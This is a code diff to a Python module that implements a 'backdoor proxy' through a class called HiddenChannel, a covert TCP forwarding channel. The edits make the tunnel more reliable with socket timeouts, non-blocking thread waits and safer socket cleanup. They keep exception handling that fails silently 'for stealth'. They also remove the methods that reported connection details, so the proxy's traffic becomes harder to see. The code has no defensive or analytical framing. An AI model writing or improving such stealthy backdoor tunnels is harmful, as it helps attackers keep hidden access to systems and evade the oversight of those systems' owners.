@@ -45,10 +45,12 @@ class HiddenChannel:
         """Handle individual client connection through proxy channel"""
         connection_id = f"conn_{self.connection_count}"
         self.connection_count += 1
+        target_socket = None
         
         try:
             # Create connection to target
             target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            target_socket.settimeout(5)  # Add timeout
             target_socket.connect((self.target_host, self.target_port))
             
             # Store connection info
@@ -74,50 +76,54 @@ class HiddenChannel:
             client_thread.start()
             target_thread.start()
             
-            # Wait for threads to complete
-            client_thread.join()
-            target_thread.join()
+            # Wait for connection to end naturally instead of blocking with join()
+            while (self.is_running and 
+                   client_thread.is_alive() and 
+                   target_thread.is_alive()):
+                time.sleep(0.1)
             
         except Exception as e:
             pass  # Silent failure for stealth
         finally:
             try:
                 client_socket.close()
-                if 'target_socket' in locals():
-                    target_socket.close()
-                if connection_id in self.connections:
-                    del self.connections[connection_id]
             except:
                 pass
+            try:
+                if target_socket:
+                    target_socket.close()
+            except:
+                pass
+            if connection_id in self.connections:
+                del self.connections[connection_id]
     
     def forward_data(self, source_socket, destination_socket, connection_id, direction):
         """Forward data between sockets"""
         try:
             while self.is_running:
-                # Use select for non-blocking check
-                ready = select.select([source_socket], [], [], 0.1)
+                # Use select for non-blocking check with longer timeout
+                ready = select.select([source_socket], [], [], 1.0)
                 if ready[0]:
-                    data = source_socket.recv(4096)
-                    if not data:
-                        break
-                    
-                    destination_socket.send(data)
-                    
-                    # Update connection stats
-                    if connection_id in self.connections:
-                        if direction == 'client_to_target':
-                            self.connections[connection_id]['bytes_sent'] += len(data)
-                        else:
-                            self.connections[connection_id]['bytes_received'] += len(data)
+                    try:
+                        data = source_socket.recv(4096)
+                        if not data:
+                            break  # Connection closed
+                        
+                        destination_socket.send(data)
+                        
+                        # Update connection stats
+                        if connection_id in self.connections:
+                            if direction == 'client_to_target':
+                                self.connections[connection_id]['bytes_sent'] += len(data)
+                            else:
+                                self.connections[connection_id]['bytes_received'] += len(data)
+                                
+                    except socket.error:
+                        break  # Socket error, exit loop
                 
         except Exception as e:
             pass  # Silent failure
-        finally:
-            try:
-                source_socket.close()
-                destination_socket.close()
-            except:
-                pass
+        # Don't close sockets here - let handle_client_connection do it
     
     def proxy_server_loop(self):
         """Main proxy server loop"""
@@ -225,20 +231,7 @@ class HiddenChannel:
         
         return status
     
-    def get_connection_details(self):
-        """Get detailed connection information"""
-        details = []
-        for conn_id, conn_info in self.connections.items():
-            details.append({
-                'id': conn_id,
-                'client_address': f"{conn_info['client_addr'][0]}:{conn_info['client_addr'][1]}",
-                'duration_seconds': (datetime.now() - conn_info['start_time']).total_seconds(),
-                'bytes_sent': conn_info['bytes_sent'],
-                'bytes_received': conn_info['bytes_received'],
-                'start_time': conn_info['start_time'].isoformat()
-            })
-        
-        return details
+
 
 
 class proxyManager:
@@ -381,16 +374,7 @@ class Backdoorproxy:
         
         return status
     
-    def get_connection_report(self):
-        """Get detailed connection report"""
-        if not self.channel:
-            return {'error': 'proxy not initialized'}
-        
-        return {
-            'status': self.channel.get_proxy_status(),
-            'connections': self.channel.get_connection_details(),
-            'generated_at': datetime.now().isoformat()
-        }
+
 
 
 # Factory function to create backdoor proxy manager
